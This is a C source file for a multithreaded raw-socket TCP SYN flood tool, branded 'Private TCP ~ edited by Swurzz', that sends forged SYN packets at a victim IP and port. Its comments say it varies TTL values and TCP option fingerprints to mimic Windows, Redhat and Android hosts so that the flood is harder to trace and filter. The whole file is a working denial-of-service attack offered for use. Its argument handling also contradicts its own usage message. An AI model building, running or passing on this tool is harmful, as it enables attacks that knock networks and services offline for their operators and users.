#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
static unsigned int srcport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
        x++;
        c++;
        }
        return (Q[i] = r - x);
}
uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}
uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
void setup_ip_header(struct iphdr *iph)
{
        iph->ihl = 5;
		iph->version = 4;
		iph->tos = 0;
		iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 12;
		iph->id = htonl(54321);
		iph->frag_off = 0x0040;
		iph->ttl = MAXTTL;
		iph->protocol = 6;
		iph->check = 0;
}
void setup_tcp_header(struct tcphdr *tcph)
{
        tcph->source = htons(5678);
        tcph->seq = rand();
        tcph->ack_seq = 0;
        tcph->res2 = 0;
		tcph->doff = 8;
        tcph->syn = 1;
        tcph->window = htons(64240);
        tcph->check = 0;
        tcph->urg_ptr = 0;
		memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\xb4\x01\x03\x03\x08\x01\x01\x04\x02", 12);
}
void *flood(void *par1)
{
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(floodport);
        sin.sin_addr.s_addr = inet_addr(td);
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
        }
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        setup_tcp_header(tcph);
        tcph->dest = htons(floodport);
        iph->saddr = sin.sin_addr.s_addr;
        iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
        }
        init_rand(time(NULL));
        register unsigned int i;
        i = 0;
		uint32_t seq = 0;
		uint8_t current = 0;
		current = rand() % 3;
		if(current == 0){
			fprintf(stdout, "Using config [0] ToS=0x00 | SYN=1 |  Win=64240 | MSS=1460 NOP WS=256 NOP NOP SACK_PERM=1\n");
		}
		else if(current == 1){
			fprintf(stdout, "Using config [1] ToS=0x00 | SYN=1 | Win=29200 | MSS=1460 SACK_PERM=1 TSval=RAND NOP WS=128\n");
		}
		else if(current == 2){
			fprintf(stdout, "Using config [2] ToS=0x00 | SYN=1 |  Win=65535 | MSS=1400 SACK_PERM=1 TSval=RAND NOP WS=128\n");
		}


		else if(current == 99){
			// Need to deeply test
			fprintf(stdout, "Using config [3] ToS=0x02 | SYN=1 ECN=1 CWR=1 | Win=8192 | MSS=1460 NOP WS=256 NOP NOP SACK_PERM=1 \n");
		}
		char *tsval;
		
		tcph->source = htons(srcport);
		
        while(1){
						
			// SYN Packet
			iph->daddr = (rand_cmwc() & 0xFFFFFFFF);
			tcph->seq = rand_cmwc() & 0xFFFFFFFF;
			iph->id = htons(rand_cmwc() & 0xFFFF);

			if(current == 0){
				// Win
				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 12;
				iph->tos = 0;
				iph->ttl = rand() % 10 + 128; // Windows 10 TTL = 128 (Add some permutation to hide the flood come from the same path)
				
				memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\xb4\x01\x03\x03\x08\x01\x01\x04\x02", 12);
				iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
				tcph->doff = 8;
				tcph->syn = 1;
				tcph->res2 = 0;
				tcph->window = htons(64240);
				tcph->check = 0;
				tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 12), sizeof (struct tcphdr) + 12);
			}
			else if(current == 1){
				// Redhat
				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 20;
				iph->tos = 0;
				iph->ttl = rand() % 10 + 64; // Redhat TTL = 64 (Add some permutation to hide the flood come from the same path)
				
				tsval = rand_cmwc() & 0xFFFFFFFF;
				
				memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\xb4\x04\x02\x08\x0a", 8);
				memcpy((void *)tcph + sizeof(struct tcphdr) + 8, &tsval, 4);
				memcpy((void *)tcph + sizeof(struct tcphdr) + 12, "\x00\x00\x00\x00\x01\x03\x03\x07", 8);
				
				iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
				tcph->doff = 10;
				tcph->syn = 1;
				tcph->res2 = 0;
				tcph->window = htons(29200);
				tcph->check = 0;
				tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
			}
			
			else if(current == 2){
				// Android
				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 20;
				iph->tos = 0;
				iph->ttl = rand() % 10 + 64; // Android TTL = 64 (Add some permutation to hide the flood come from the same path)
				
				tsval = rand_cmwc() & 0xFFFFFFFF;
				
				memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\x78\x04\x02\x08\x0a", 8);
				memcpy((void *)tcph + sizeof(struct tcphdr) + 8, &tsval, 4);
				memcpy((void *)tcph + sizeof(struct tcphdr) + 12, "\x00\x00\x00\x00\x01\x03\x03\x07", 8);
				
				iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
				tcph->doff = 10;
				tcph->syn = 1;
				tcph->res2 = 0;
				tcph->window = htons(65535);
				tcph->check = 0;
				tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
			}
			else if(current == 3){
				// Idk some unix (Not working fine some providers mitigate ???)
				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 12;
				iph->tos = 0x02;
				
				memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\xb4\x01\x03\x03\x08\x01\x01\x04\x02", 12);
				
				iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
				tcph->doff = 8;
				tcph->syn = 1;
				tcph->res2 = 3;
				tcph->window = htons(8192);
				tcph->check = 0;
				tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 12), sizeof (struct tcphdr) + 12);
			}
			
			
			
			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
			
			pps++;
			if(i >= limiter)
			{
			i = 0;
			usleep(sleeptime);
			}
			i++;
        }
}
int main(int argc, char *argv[ ])
{
        if(argc < 7){
        fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Private TCP ~ edited by Swurzz \n");
        fprintf(stdout, "Usage: %s <target IP> <port of victim> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);
        }
        fprintf(stdout, "Setting up Sockets...\n");	
        int num_threads = atoi(argv[4]);
        floodport = atoi(argv[3]);
		srcport = atoi(argv[2]);
        int maxpps = atoi(argv[5]);
        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads];
        int multiplier = 20;
        int i;
        for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        }
        fprintf(stdout, "Starting Flood...\n");
        for(i = 0;i<(atoi(argv[6])*multiplier);i++)
        {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
        if(1 > limiter)
        {
        sleeptime+=100;
        } else {
        limiter--;
        }
        } else {
        limiter++;
        if(sleeptime > 25)
        {
        sleeptime-=25;
        } else {
        sleeptime = 0;
        }
        }
        pps = 0;
        }
        return 0;
}